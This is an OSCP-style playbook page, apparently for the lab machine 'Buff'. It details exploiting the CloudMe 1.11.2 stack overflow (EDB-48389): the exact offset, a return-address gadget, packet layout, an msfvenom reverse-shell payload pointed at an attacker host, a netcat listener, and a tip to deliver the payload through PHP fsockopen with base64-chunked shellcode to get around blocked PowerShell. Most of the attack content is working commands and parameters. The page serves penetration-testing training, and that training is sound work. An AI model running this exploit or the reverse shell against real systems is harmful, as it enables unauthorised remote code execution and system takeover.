# Windows - Remote - CloudMe Buffer Overflow

**Step 27B of 50 · Windows**

*Exploit CloudMe 1.11.2 with the standalone EDB-48389 stack overflow.*

## Run this

Confirm the process architecture and service reachability:

~~~bash
file $BoxDir/loot/cloudme_installer/CloudMe.exe
nmap -sT -sV -Pn -n -p 8888 127.0.0.1
searchsploit "CloudMe 1.11.2"
searchsploit -m 48389
~~~

EDB-48389 is a 32-bit TCP overflow. Preserve its packet construction and
replace only the placeholder payload:

- 1052 bytes to the saved return address
- 0x68A842B5, PUSH ESP; RET, from Qt5Core.dll
- 30 NOP bytes after the return address
- 1500 bytes total
- x86 shellcode, even when the Windows host is x64

## Read the packet layout first

The public values describe a fixed packet:

~~~text
1052 bytes padding
4 bytes: 0x68A842B5 in little-endian order
30 bytes NOP sled
x86 shellcode
C padding until the packet is exactly 1500 bytes
~~~

The gadget is PUSH ESP; RET in the Qt5Core.dll loaded by the 32-bit process.
It redirects execution into the stack bytes following the overwritten return
address. Preserve the offset and gadget while changing only the shellcode or
delivery method.

Generate a stageless x86 callback:

~~~bash
msfvenom -a x86 --platform Windows \
  -p windows/shell_reverse_tcp LHOST=$LocalIP LPORT=$ListenPort \
  EXITFUNC=thread -b "\x00\x0a\x0d" -f raw \
  -o $BoxDir/exploits/buff_shellcode.bin
~~~

Start the listener before sending the overflow:

~~~bash
nc -lvnp $ListenPort
python3 $BoxDir/exploits/buff_cloudme_48389_runner.py \
  127.0.0.1 8888 $BoxDir/exploits/buff_shellcode.bin
~~~

If the service restarts but no callback arrives, keep the tested buffer and
deliver it from the target's PHP process rather than a PowerShell wrapper. Build
the 1052-byte padding, packed little-endian return address, 30-byte NOP sled,
decoded shellcode, and C padding in PHP, then send it with fsockopen to
127.0.0.1:8888. Split the shellcode into base64 chunks in the PHP source.

## What did you get?

- [ ] CloudMe is not reachable → **Return to Step 27A · [[Windows - Port Forwarding]]**
- [ ] The target service restarts after the 1500-byte buffer → **Treat the crash as evidence that the overwrite path is active**
- [ ] The service restarts but there is no callback → **Check x86 shellcode, listener timing, bad characters, and direct PHP delivery**
- [ ] A Windows shell connects → **Run whoami and hostname, then go to Step 28 · [[Windows - Privilege Triage]]**
- [ ] The service does not restart → **Recheck the port mapping, offset, return address, and target architecture**

## Notes

The return address is inside a bundled Qt DLL loaded by the 32-bit CloudMe
process. Do not substitute a 64-bit shellcode payload merely because
systeminfo reports an x64 operating system.

The EDB-48389 local PoC uses the correct offset and gadget but contains a
calculator payload. A file-based shellcode runner prevents long byte strings
from being transcribed into the packet-building code.

## Gotcha

> [!warning] 💡
> A wrapped PowerShell or dropped executable may be blocked even when the
> overflow itself is correct. In Buff, the public runner consistently restarted
> CloudMe, while the direct PHP fsockopen sender returned the Administrator
> shell.

## Seen in

- [[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]] -- CloudMe 1.11.2 loopback BOF

## Related stages

- [[Windows - Port Forwarding]]
- [[Windows - Exploit Search]]
- [[Windows - Shell Received]]
- [[Windows - Clean Down]]

## External Resources

- [Exploit-DB 48389](https://www.exploit-db.com/exploits/48389)
- [[Buffer Overflow & Memory Corruption]]
- [[Buffer Overflow & Memory Corruption (Decision Tree)]]

## Why this matters for OSCP

This is a classic example of separating exploit correctness from payload
delivery: preserve the proven overwrite, validate the crash, then change only
how the shellcode reaches the vulnerable socket.
